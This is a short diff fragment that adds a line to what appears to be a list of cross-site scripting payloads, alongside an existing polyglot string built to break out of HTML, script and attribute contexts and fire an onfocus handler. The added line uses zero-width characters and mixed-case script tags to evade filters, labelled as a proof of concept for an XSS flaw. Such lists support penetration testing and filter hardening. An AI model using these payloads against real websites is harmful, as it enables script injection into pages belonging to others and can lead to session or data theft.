@@ -1,3 +1,4 @@
+><​script%3("hello")<​/script><​Script>alert("IIT ******** XSS VULNERABILITY POC BY V4N")<​/script>
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 <!--</Title/<​/Style/<​/Script/</textArea/</iFrame>
 \74k<K/contentEditable/autoFocus/OnFocus​=
